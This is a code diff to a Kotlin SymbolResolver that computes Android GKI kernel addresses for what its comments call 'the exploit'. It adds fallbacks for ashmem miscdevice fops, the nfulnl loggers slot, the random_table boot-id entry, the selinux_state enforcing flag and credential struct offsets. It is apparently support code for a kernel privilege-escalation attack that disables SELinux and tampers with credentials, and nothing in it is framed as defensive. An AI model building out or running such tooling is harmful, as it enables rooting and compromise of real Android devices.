@@ -11,7 +11,8 @@ object SymbolResolver {
         "ashmem_mmap", "ashmem_open", "ashmem_release", "ashmem_show_fdinfo",
         "configfs_read_iter", "configfs_bin_write_iter", "copy_splice_read", "noop_llseek",
         // static / unexported symbols — resolved by delta anchoring below
-        "nfulnl_logger", "sysctl_bootid", "loggers", "ashmem_fops", "ashmem_misc_fops",
+        "nfulnl_logger", "sysctl_bootid", "random_table", "loggers", "ashmem_fops",
+        "ashmem_misc_fops", "ashmem_miscs", "ashmem_misc",
         // 6.1/6.6 have no bare `selinux_enforcing` global; the flag lives at
         // offset 0 of the `selinux_state` struct, so we look that up instead.
         "selinux_state",
@@ -48,15 +49,28 @@ object SymbolResolver {
             ?: if (ioctl != 0L) ioctl + if (family == 61) 0x647e28L else 0x669bb8L
             else if (open != 0L) open + if (family == 61) 0x647278L else 0x669288L
             else 0L
+        // Recent Android GKI kernels export the ashmem miscdevice array as
+        // `ashmem_miscs`, not the address of its fops member.  The fops field
+        // is the fourth pointer-sized field in struct miscdevice (+0x10).
         val miscFops = off("ashmem_misc_fops").takeIf { it != 0L }
+            ?: off("ashmem_miscs").takeIf { it != 0L }?.plus(0x10L)
+            ?: off("ashmem_misc").takeIf { it != 0L }?.plus(0x10L)
             ?: if (ioctl != 0L) ioctl + if (family == 61) 0x1543e58L else 0x15fec60L
             else if (open != 0L) open + if (family == 61) 0x15432a8L else 0x15fe330L
             else 0L
 
         val nfulnl = off("nfulnl_logger")
-        val loggers = off("loggers").takeIf { it != 0L } ?: if (nfulnl != 0L) nfulnl - 0xb0L else 0L
+        val loggersBase = off("loggers").takeIf { it != 0L }
+            ?: if (nfulnl != 0L) nfulnl - 0xb0L else 0L
+        // The exploit uses loggers[0][1], not the array base at loggers[0][0].
+        val loggers = loggersBase + if (loggersBase != 0L) 0x8L else 0L
         val sysctlBootid = off("sysctl_bootid")
-        val randomBootIdData = off("sysctl_bootid").takeIf { it != 0L }
+        // `sysctl_bootid` is the value stored in random_table[4].data; the
+        // exploit needs the table slot itself.  On these GKI builds the
+        // random_table entries are 0x40 bytes and the data member is +0x8.
+        // Prefer the symbol directly so this works across CP3A builds rather
+        // than assuming a fixed distance from sysctl_bootid.
+        val randomBootIdData = off("random_table").takeIf { it != 0L }?.plus(0x108L)
             ?: if (sysctlBootid != 0L) sysctlBootid - if (family == 61) 0x143790L else 0x141e70L else 0L
 
         // selinux_enforcing is the `bool` at offset 0 of `selinux_state` on
@@ -131,4 +145,3 @@ object SymbolResolver {
         "cred_caps" to 48, "cred_security" to 128,
     )
 }
-
